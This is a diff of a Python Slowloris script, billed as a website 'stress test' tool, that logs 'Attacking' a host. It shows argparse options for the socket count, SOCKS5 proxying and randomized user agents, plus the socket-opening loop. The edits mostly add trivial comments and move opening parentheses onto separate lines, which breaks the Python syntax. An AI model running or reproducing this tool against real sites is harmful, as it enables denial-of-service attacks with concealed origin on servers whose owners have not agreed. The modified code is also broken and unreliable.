@@ -6,31 +6,37 @@ import socket
 import sys
 import time
 
-parser = argparse.ArgumentParser(
+parser = argparse.ArgumentParser
+(
     description="Slowloris, low bandwidth stress test tool for websites"
 )
-parser.add_argument("host", nargs="?", help="Host to perform stress test on")
+parser.add_argument
+("host", nargs="?", help="Host to perform stress test on")
 parser.add_argument(
     "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
 )
-parser.add_argument(
+parser.add_argument
+(
     "-s",
     "--sockets",
     default=500,
     help="Number of sockets to use in the test",
     type=int,
 )
-parser.add_argument(
+parser.add_argument
+(
     "-v", "--verbose", dest="verbose", action="store_true", help="Increases logging"
 )
-parser.add_argument(
+parser.add_argument
+(
     "-ua",
     "--randuseragents",
     dest="randuseragent",
     action="store_true",
     help="Randomizes user-agents with each request",
 )
-parser.add_argument(
+parser.add_argument
+(
     "-x",
     "--useproxy",
     dest="useproxy",
@@ -42,7 +48,8 @@ parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", ty
 parser.add_argument(
     "--https", dest="https", action="store_true", help="Use HTTPS for the requests"
 )
-parser.add_argument(
+parser.add_argument
+(
     "-i",
     "--sleeptime",
     dest="sleeptime",
@@ -71,7 +78,6 @@ if args.useproxy:
     # the proxy by default
     try:
         import socks
-
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
         socket.socket = socks.socksocket
         logging.info("Using SOCKS5 proxy for connecting...")
@@ -123,9 +129,7 @@ user_agents = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
-
-
-def init_socket(ip):
+def init_socket(ip):     #function definition
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     if args.https:
@@ -142,7 +146,7 @@ def init_socket(ip):
     return s
 
 
-def main():
+def main():    #function definition
     ip = args.host
     socket_count = args.sockets
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
@@ -151,7 +155,7 @@ def main():
     for _ in range(socket_count):
         try:
             logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip)
+            s = init_socket(ip)       #function calling
         except socket.error as e:
             logging.debug(e)
             break
@@ -188,4 +192,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    main()   #function calling
